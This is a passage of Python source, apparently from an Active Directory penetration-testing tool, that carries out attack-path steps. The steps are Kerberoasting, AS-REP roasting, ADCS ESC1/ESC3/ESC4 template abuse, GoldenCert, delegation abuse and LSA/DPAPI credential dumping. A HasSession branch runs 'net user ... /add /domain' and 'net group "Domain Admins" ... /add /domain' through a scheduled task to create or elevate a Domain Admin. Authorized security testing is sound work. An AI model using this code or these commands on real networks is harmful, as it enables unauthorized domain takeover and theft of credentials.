                        target_label_value=to_label or exec_context.target_sam_or_label,
                        initial_followups=followups,
                        last_outcome=last_outcome,
                    )

                continue

            if key in {"kerberoasting", "asreproasting"}:
                if not to_label:
                    print_warning(f"Cannot execute {action}: missing target user.")
                    return execution_started
                target_user = _normalize_account(to_label)
                if not target_user:
                    print_warning(f"Cannot execute {action}: invalid target user.")
                    return execution_started

                execution_started = True
                ok = False
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"target_user": target_user},
                ):
                    if key == "kerberoasting":
                        ok = run_kerberoast_for_user(
                            shell, domain, target_user=target_user
                        )
                    else:
                        ok = run_asreproast_for_user(
                            shell, domain, target_user=target_user
                        )
                if not ok:
                    marked_user = mark_sensitive(target_user, "user")
                    print_warning(
                        f"{action} did not recover credentials for {marked_user}. Stopping this path."
                    )
                    return True
                last_outcome = get_last_ace_execution_outcome(shell) or {}
                _apply_execution_outcome_context_handoff(last_outcome)
                if idx == last_executable_idx:
                    _run_runtime_followups(
                        step_action=action,
                        target_label_value=to_label or target_user,
                        last_outcome=last_outcome,
                    )
                # If cracking succeeded, downstream steps can use the stored credential.
                continue

            if key == "adcsesc1":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC1: missing from/to details.")
                    print_info_debug(
                        f"[adcsesc1] Missing labels: from_label={from_label!r}, to_label={to_label!r}"
                    )
                    return execution_started

                # BloodHound models ESC1 as a direct edge to the Domain node. The actual
                # exploit requires a vulnerable certificate template, so we enumerate
                # templates via Certipy for the selected credential and pick one.
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    marked_user = mark_sensitive(from_label, "user")
                    print_warning(
                        f"Cannot execute ADCSESC1: no execution user context available for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    print_info_debug(
                        f"[adcsesc1] No exec username: context_username={context_username!r}, "
                        f"applies_to_users={summary.get('applies_to_users')!r}"
                    )
                    return execution_started

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"Cannot execute ADCSESC1: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    print_info_debug(
                        f"[adcsesc1] Missing credential: context_password={'set' if context_password else 'unset'}, "
                        f"resolved_password={'set' if _resolve_domain_password(shell, domain, exec_username) else 'unset'}"
                    )
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC1 for {marked_domain}: missing PDC IP in domain data."
                    )
                    _mark_blocked_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC IP in domain data",
                    )
                    print_info_debug(
                        f"[adcsesc1] Domain data missing pdc: keys={list(domain_data.keys())!r}"
                    )
                    return execution_started
                if not domain_data.get("adcs") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC1 for {marked_domain}: missing ADCS/CA info."
                    )
                    _mark_blocked_step(
                        "ADCSESC1",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing ADCS/CA info in domain data",
                    )
                    print_info_debug(
                        f"[adcsesc1] Missing ADCS metadata: adcs={domain_data.get('adcs')!r}, "
                        f"ca={domain_data.get('ca')!r}"
                    )
                    return execution_started

                esc1_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="1",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                )
                if not esc1_templates:
                    manual_template = _prompt_for_manual_adcs_template(esc_number="1")
                    if manual_template:
                        esc1_templates = [manual_template]
                        print_info_debug(
                            "[adcsesc1] Using operator-specified template: "
                            f"{mark_sensitive(manual_template, 'service')}"
                        )
                    else:
                        print_warning(
                            "No ESC1 vulnerable certificate templates found for this user."
                        )
                        return execution_started
                if not esc1_templates:
                    print_warning(
                        "No ESC1 vulnerable certificate templates found for this user."
                    )
                    return execution_started

                template = _select_adcs_template(
                    shell,
                    esc_number="1",
                    templates=esc1_templates,
                )
                if not template:
                    print_warning("ESC1 execution cancelled.")
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action="ADCSESC1",
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username, "template": template},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC1",
                            to_label=to_label,
                            status="attempted",
                            notes={"username": exec_username, "template": template},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    if hasattr(shell, "adcs_esc1"):
                        shell.adcs_esc1(  # type: ignore[attr-defined]
                            domain, exec_username, password, template
                        )
                    else:
                        from adscan_internal.cli.adcs_exploitation import adcs_esc1

                        adcs_esc1(
                            shell,
                            domain=domain,
                            username=exec_username,
                            password=password,
                            template=template,
                        )
                continue

            if key == "adcsesc3":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC3: missing from/to details.")
                    return execution_started

                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    marked_user = mark_sensitive(from_label, "user")
                    print_warning(
                        f"Cannot execute ADCSESC3: no execution user context available for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"Cannot execute ADCSESC3: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC3 for {marked_domain}: missing PDC IP in domain data."
                    )
                    _mark_blocked_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC IP in domain data",
                    )
                    return execution_started
                if not domain_data.get("adcs") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC3 for {marked_domain}: missing ADCS/CA info."
                    )
                    _mark_blocked_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing ADCS/CA info in domain data",
                    )
                    return execution_started

                esc3_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="3",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                )
                if not esc3_templates:
                    manual_template = _prompt_for_manual_adcs_template(esc_number="3")
                    if manual_template:
                        esc3_templates = [manual_template]
                        print_info_debug(
                            "[adcsesc3] Using operator-specified template: "
                            f"{mark_sensitive(manual_template, 'service')}"
                        )
                    else:
                        print_warning(
                            "No ESC3 vulnerable certificate templates found for this user."
                        )
                        return execution_started
                if not esc3_templates:
                    print_warning(
                        "No ESC3 vulnerable certificate templates found for this user."
                    )
                    return execution_started

                template = _select_adcs_template(
                    shell,
                    esc_number="3",
                    templates=esc3_templates,
                )
                if not template:
                    print_warning("ESC3 execution cancelled.")
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action="ADCSESC3",
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username, "template": template},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC3",
                            to_label=to_label,
                            status="attempted",
                            notes={"username": exec_username, "template": template},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    if hasattr(shell, "adcs_esc3"):
                        shell.adcs_esc3(  # type: ignore[attr-defined]
                            domain, exec_username, password, template
                        )
                    else:
                        from adscan_internal.cli.adcs_exploitation import adcs_esc3

                        adcs_esc3(
                            shell,
                            domain=domain,
                            username=exec_username,
                            password=password,
                            template=template,
                        )
                continue

            if key == "adcsesc4":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC4: missing from/to details.")
                    return execution_started

                # Prefer using the credential for the step source (the user that has
                # the ESC4 relationship), then fall back to the context user and
                # finally to an applies_to user (owned/group paths).
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    marked_user = mark_sensitive(from_label, "user")
                    print_warning(
                        f"Cannot execute ADCSESC4: no execution user context available for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"Cannot execute ADCSESC4: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC4 for {marked_domain}: missing PDC IP in domain data."
                    )
                    _mark_blocked_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC IP in domain data",
                    )
                    return execution_started
                if not domain_data.get("adcs") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC4 for {marked_domain}: missing ADCS/CA info."
                    )
                    _mark_blocked_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing ADCS/CA info in domain data",
                    )
                    return execution_started

                # ESC4 is disruptive: it modifies a certificate template in AD.
                # Require explicit operator confirmation.
                message = Text()
                marked_user = mark_sensitive(exec_username, "user")
                message.append(
                    "ESC4 will modify an ADCS certificate template in Active Directory.\n",
                    style="bold yellow",
                )
                message.append(
                    f"Execution user: {marked_user}\n\n",
                    style="bold",
                )
                message.append(
                    "What ADscan will do:\n",
                    style="bold",
                )
                message.append(
                    " - Backup current template configuration\n"
                    " - Modify the template to enable ESC1-style abuse\n"
                    " - Request an auth certificate and attempt Pass-the-Certificate\n"
                    " - Restore the original template configuration (best-effort)\n\n",
                    style="dim",
                )
                message.append(
                    "Risk notes:\n",
                    style="bold",
                )
                message.append(
                    " - If restore fails, the template may remain modified until manually restored.\n",
                    style="dim",
                )
                print_panel(
                    message,
                    title=Text("Disruptive Operation: ADCS ESC4", style="bold yellow"),
                    border_style="yellow",
                    expand=False,
                )
                if not Confirm.ask(
                    "Proceed with ESC4 template modification?",
                    default=True,
                ):
                    print_warning("ESC4 execution cancelled by operator.")
                    return execution_started

                esc4_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="4",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                    allow_object_control=True,
                )

                if not esc4_templates:
                    manual_template = _prompt_for_manual_adcs_template(esc_number="4")
                    if manual_template:
                        esc4_templates = [manual_template]
                        print_info_debug(
                            "[adcsesc4] Using operator-specified template: "
                            f"{mark_sensitive(manual_template, 'service')}"
                        )
                    else:
                        marked_user = mark_sensitive(exec_username, "user")
                        print_warning(
                            f"No ESC4 vulnerable certificate templates found for {marked_user}."
                        )
                        return execution_started
                if not esc4_templates:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"No ESC4 vulnerable certificate templates found for {marked_user}."
                    )
                    return execution_started

                template = _select_adcs_template(
                    shell,
                    esc_number="4",
                    templates=esc4_templates,
                )
                if not template:
                    print_warning("ESC4 execution cancelled.")
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action="ADCSESC4",
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username, "template": template},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC4",
                            to_label=to_label,
                            status="attempted",
                            notes={"username": exec_username, "template": template},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    if hasattr(shell, "adcs_esc4"):
                        shell.adcs_esc4(  # type: ignore[attr-defined]
                            domain, exec_username, password, template
                        )
                    else:
                        from adscan_internal.cli.adcs_exploitation import adcs_esc4

                        adcs_esc4(
                            shell,
                            domain=domain,
                            username=exec_username,
                            password=password,
                            template=template,
                        )
                continue

            if key == "goldencert":
                if not from_label or not to_label:
                    print_warning("Cannot execute GoldenCert: missing from/to details.")
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute GoldenCert for {marked_domain}: missing PDC/CA info."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC/CA info in domain data",
                    )
                    return execution_started

                exec_username = _resolve_golden_cert_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not exec_username or not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        "Cannot execute GoldenCert: no stored credential found for "
                        f"{marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                ca_target_host = _resolve_golden_cert_target_host(
                    shell,
                    domain=domain,
                    from_label=from_label,
                    domain_data=domain_data,
                )
                if not ca_target_host:
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute GoldenCert for {marked_domain}: CA host is not resolvable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="CA host is not resolvable",
                    )
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action="GoldenCert",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "ca_host": ca_target_host,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="GoldenCert",
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "ca_host": ca_target_host,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    if hasattr(shell, "adcs_golden_cert"):
                        shell.adcs_golden_cert(  # type: ignore[attr-defined]
                            domain,
                            exec_username,
                            password,
                            ca_target_host,
                        )
                    else:
                        from adscan_internal.cli.adcs_exploitation import (
                            adcs_golden_cert,
                        )

                        adcs_golden_cert(
                            shell,
                            domain=domain,
                            username=exec_username,
                            password=password,
                            ca_target_host=ca_target_host,
                        )
                continue

            if key == "hassession":
                if not from_label or not to_label:
                    print_warning("Cannot execute HasSession: missing from/to details.")
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing from/to details",
                    )
                    return execution_started

                target_host, session_user = _resolve_hassession_host_and_user(
                    shell,
                    domain=domain,
                    from_label=from_label,
                    to_label=to_label,
                )
                if not target_host:
                    print_warning(
                        "Cannot execute HasSession: session host is not resolvable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Session host is not resolvable",
                    )
                    return execution_started
                if not session_user or not _is_valid_domain_username(
                    session_user, allow_machine=True
                ):
                    print_warning(
                        "Cannot execute HasSession: session user is not resolvable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Session user is not resolvable",
                    )
                    return execution_started

                exec_username, password, exec_context_source = (
                    _resolve_hassession_execution_user(
                        shell,
                        domain=domain,
                        summary=summary,
                        steps=steps,
                        current_step_index=idx - 1,
                        target_host=target_host,
                        from_label=from_label,
                        context_username=context_username,
                        context_password=context_password,
                    )
                )
                if not exec_username or not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        "Cannot execute HasSession: no stored credential found for "
                        f"{marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started
                if exec_context_source == "generic_context":
                    print_info_debug(
                        "[hassession] No prior host-access credential context "
                        "for this host; using generic execution credential context."
                    )

                non_interactive = is_non_interactive(shell)
                create_new_user = True
                if not non_interactive and hasattr(shell, "_questionary_select"):
                    options = [
                        "Create new domain user, then add to Domain Admins (Recommended)",
                        "Add existing domain user to Domain Admins",
                        "Cancel",
                    ]
                    choice = shell._questionary_select(
                        "HasSession exploitation mode:",
                        options,
                        default_idx=0,
                    )
                    if choice is None or choice >= len(options) - 1:
                        return execution_started
                    create_new_user = choice == 0
                elif not non_interactive:
                    create_new_user = Confirm.ask(
                        "Create a new domain user and add it to Domain Admins?",
                        default=True,
                    )

                target_user = ""
                target_password: str | None = None
                if create_new_user:
                    default_user = _generate_default_hassession_username()
                    if non_interactive:
                        selected_user = default_user
                    else:
                        selected_user = Prompt.ask(
                            "New domain username to create",
                            default=default_user,
                        ).strip()
                    selected_user = _normalize_account(selected_user)
                    if not _is_valid_domain_username(selected_user):
                        print_warning(
                            "Cannot execute HasSession: invalid new username. "
                            "Use 1-20 chars with letters, digits, dot, underscore or hyphen."
                        )
                        return execution_started

                    generated_password = _generate_strong_password(12)
                    if non_interactive:
                        selected_password = generated_password
                    else:
                        selected_password = Prompt.ask(
                            "Password for the new domain user",
                            default=generated_password,
                        ).strip()
                    if not _is_password_complex(selected_password):
                        print_warning(
                            "Cannot execute HasSession: password must be at least "
                            "12 chars and include lower/upper/digit/symbol."
                        )
                        return execution_started
                    target_user = selected_user
                    target_password = selected_password
                else:
                    stored_creds = (
                        getattr(shell, "domains_data", {})
                        .get(domain, {})
                        .get("credentials", {})
                    )
                    credential_users = (
                        sorted(
                            {
                                str(user).strip()
                                for user in stored_creds.keys()
                                if isinstance(user, str)
                                and _is_valid_domain_username(
                                    _normalize_account(user)
                                )
                            },
                            key=str.lower,
                        )
                        if isinstance(stored_creds, dict)
                        else []
                    )
                    if non_interactive:
                        selected_user = exec_username
                    elif hasattr(shell, "_questionary_select") and credential_users:
                        options = credential_users + ["Enter username", "Cancel"]
                        selected_idx = shell._questionary_select(
                            "Select the user to elevate to Domain Admins:",
                            options,
                            default_idx=0,
                        )
                        if selected_idx is None or selected_idx >= len(options) - 1:
                            return execution_started
                        if selected_idx == len(options) - 2:
                            selected_user = Prompt.ask(
                                "Existing username to add to Domain Admins",
                                default=exec_username,
                            ).strip()
                        else:
                            selected_user = options[selected_idx]
                    else:
                        selected_user = Prompt.ask(
                            "Existing username to add to Domain Admins",
                            default=exec_username,
                        ).strip()
                    target_user = _normalize_account(selected_user)
                    if not _is_valid_domain_username(target_user):
                        print_warning(
                            "Cannot execute HasSession: invalid target username."
                        )
                        return execution_started

                group_candidates = _resolve_domain_admin_group_candidates(shell, domain)
                if not group_candidates:
                    group_candidates = ["Domain Admins", "Admins. del dominio"]

                marked_host = mark_sensitive(target_host, "hostname")
                marked_session_user = mark_sensitive(session_user, "user")
                marked_exec_user = mark_sensitive(exec_username, "user")
                marked_target_user = mark_sensitive(target_user, "user")
                mode_label = "create+addmember" if create_new_user else "addmember"
                print_panel(
                    "\n".join(
                        [
                            f"Domain: {mark_sensitive(domain, 'domain')}",
                            f"Target host: {marked_host}",
                            f"Session user: {marked_session_user}",
                            f"Executor: {marked_exec_user}",
                            f"Mode: {mode_label}",
                            f"Target user: {marked_target_user}",
                        ]
                    ),
                    title=Text(
                        "HasSession Exploitation Plan",
                        style=f"bold {BRAND_COLORS['info']}",
                    ),
                    border_style=BRAND_COLORS["info"],
                    expand=False,
                )

                if not non_interactive and not Confirm.ask(
                    "Execute HasSession exploitation now?",
                    default=True,
                ):
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "target_host": target_host,
                        "session_user": session_user,
                        "target_user": target_user,
                        "mode": mode_label,
                        "exec_context_source": exec_context_source,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "target_host": target_host,
                                "session_user": session_user,
                                "target_user": target_user,
                                "mode": mode_label,
                                "exec_context_source": exec_context_source,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    command_failed = False
                    if create_new_user and target_password is not None:
                        create_command = (
                            f'net user "{target_user}" "{target_password}" /add /domain'
                        )
                        create_ok, create_output = _run_hassession_schtask_command(
                            shell,
                            domain=domain,
                            exec_username=exec_username,
                            exec_password=password,
                            target_host=target_host,
                            session_user=session_user,
                            command_to_run=create_command,
                            log_suffix="create_user",
                        )
                        if not create_ok:
                            lowered = create_output.lower()
                            already_exists = any(
                                marker in lowered
                                for marker in (
                                    "account already exists",
                                    "ya existe",
                                    "el usuario ya existe",
                                    "2224",
                                )
                            )
                            if already_exists:
                                print_warning(
                                    "Target user already exists. Continuing with group escalation."
                                )
                            else:
                                print_warning(
                                    "HasSession user-creation command did not complete successfully."
                                )
                                command_failed = True

                    verified_da = False
                    selected_group: str | None = None
                    waited_for_membership = False
                    if not command_failed:
                        for group_name in group_candidates:
                            add_command = (
                                f'net group "{group_name}" "{target_user}" /add /domain'
                            )
                            add_ok, _ = _run_hassession_schtask_command(
                                shell,
                                domain=domain,
                                exec_username=exec_username,
                                exec_password=password,
                                target_host=target_host,
                                session_user=session_user,
                                command_to_run=add_command,
                                log_suffix=f"addmember_{group_name}",
                            )
                            if not add_ok:
                                continue
                            if not waited_for_membership:
                                _wait_for_hassession_membership_propagation(
                                    shell,
                                    domain=domain,
                                    target_user=target_user,
                                )
                                waited_for_membership = True
                            membership = _is_user_domain_admin_via_sid(
                                shell,
                                domain=domain,
                                target_user=target_user,
                                auth_username=exec_username,
                                auth_password=password,
                            )
                            if membership is True:
                                verified_da = True
                                selected_group = group_name
                                break

                    if not verified_da and not command_failed:
                        if not waited_for_membership:
                            _wait_for_hassession_membership_propagation(
                                shell,
                                domain=domain,
                                target_user=target_user,
                            )
                        membership = _is_user_domain_admin_via_sid(
                            shell,
                            domain=domain,
                            target_user=target_user,
                            auth_username=exec_username,
                            auth_password=password,
                        )
                        verified_da = membership is True

                    if verified_da:
                        try:
                            update_edge_status_by_labels(
                                shell,
                                domain,
                                from_label=from_label,
                                relation=action,
                                to_label=to_label,
                                status="success",
                                notes={
                                    "username": exec_username,
                                    "target_host": target_host,
                                    "session_user": session_user,
                                    "target_user": target_user,
                                    "mode": mode_label,
                                    "group": selected_group or "RID-512",
                                    "exec_context_source": exec_context_source,
                                },
                            )
                        except Exception as exc:  # noqa: BLE001
                            telemetry.capture_exception(exc)

                        print_info(
                            "HasSession escalation confirmed: "
                            f"{mark_sensitive(target_user, 'user')} is now in "
                            "Domain Admins (RID 512)."
                        )
                        if hasattr(shell, "add_credential"):
                            credential_to_register = target_password or (
                                _get_stored_domain_credential_for_user(
                                    shell, domain=domain, username=target_user
                                )
                            )
                            if credential_to_register:
                                add_credential_fn = getattr(shell, "add_credential", None)
                                if callable(add_credential_fn):
                                    add_credential_fn(
                                        domain,
                                        target_user,
                                        credential_to_register,
                                    )
                            else:
                                print_info_debug(
                                    "[hassession] Escalation verified but no stored credential "
                                    f"available for {mark_sensitive(target_user, 'user')}; "
                                    "skipping add_credential post-flow trigger."
                                )
                    else:
                        try:
                            update_edge_status_by_labels(
                                shell,
                                domain,
                                from_label=from_label,
                                relation=action,
                                to_label=to_label,
                                status="failed",
                                notes={
                                    "username": exec_username,
                                    "target_host": target_host,
                                    "session_user": session_user,
                                    "target_user": target_user,
                                    "mode": mode_label,
                                    "exec_context_source": exec_context_source,
                                },
                            )
                        except Exception as exc:  # noqa: BLE001
                            telemetry.capture_exception(exc)
                        print_warning(
                            "HasSession exploitation executed, but Domain Admin "
                            "membership could not be verified."
                        )
                continue

            if key == "allowedtodelegate":
                if not from_label or not to_label:
                    print_warning(
                        "Cannot execute AllowedToDelegate: missing from/to details."
                    )
                    return execution_started

                # Prefer running with the provided context credential. Otherwise try to use the
                # credential for the source node when available.
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                if not hasattr(shell, "enum_delegations_user"):
                    print_warning(
                        "Cannot execute this step: delegation executor is unavailable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Delegation executor unavailable",
                    )
                    return execution_started

                execution_started = True

                with _active_step_context(
                    action="AllowedToDelegate",
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="AllowedToDelegate",
                            to_label=to_label,
                            status="attempted",
                            notes={"username": exec_username},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    shell.enum_delegations_user(domain, exec_username, password)
                continue

            if key in {"dumplsa", "dumpdpapi"}:
                if not from_label:
                    print_warning(
                        f"Cannot execute {action}: missing source host details."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing source host details",
                    )
                    return execution_started

                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not exec_username or not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                source_host = (
                    resolve_netexec_target_for_node_label(
                        shell, domain, node_label=from_label
                    )
                    or ""
                )
                if not source_host:
                    print_warning(
                        f"Cannot execute {action}: source node is not a resolvable host."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Source node is not a resolvable host",
                    )
                    return execution_started

                if key == "dumplsa":
                    dump_handler = getattr(shell, "dump_lsa", None)
                else:
                    dump_handler = getattr(shell, "dump_dpapi", None)
                if not callable(dump_handler):
                    print_warning(
                        f"Cannot execute {action}: dump executor is unavailable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Dump executor unavailable",
                    )
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username, "target_host": source_host},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "target_host": source_host,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    dump_handler(
                        domain,
                        exec_username,
                        password,
                        source_host,
                        "false",
                    )

                target_user = _normalize_account(to_label)
                if target_user and not _resolve_domain_password(
                    shell, domain, target_user
                ):
                    marked_user = mark_sensitive(target_user, "user")
                    print_warning(
                        f"{action} did not recover a credential for {marked_user}. Stopping this path."
                    )
                    return True
                continue

            # Unknown supported key shouldn't happen due to pre-check, but keep safe.
            print_warning(f"Cannot execute this step yet: {action}")
            return execution_started

        return execution_started

    finally:
        clear_attack_path_execution(shell)


def offer_attack_paths_for_execution(
    shell: Any,
    domain: str,
    *,
    start: str,
    max_depth: int = 10,
    max_display: int = 20,
    include_all: bool = False,
    target_mode: str = "impact",
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
) -> bool:
    """Offer attack paths to the user and optionally execute one.

    Args:
        shell: Shell instance with `_questionary_select` (optional) and attack actions.
        domain: Target domain.
        start: Either a username label or the special value `owned`.
        max_depth: Max path depth for pathfinding.
        max_display: Max number of paths to show in the summary and selection.
        include_all: When True, include paths to non-high-value targets.
        context_username/context_password: When provided, use these credentials for
            execution attempts (useful for `ask_for_user_privs` flows).

    Returns:
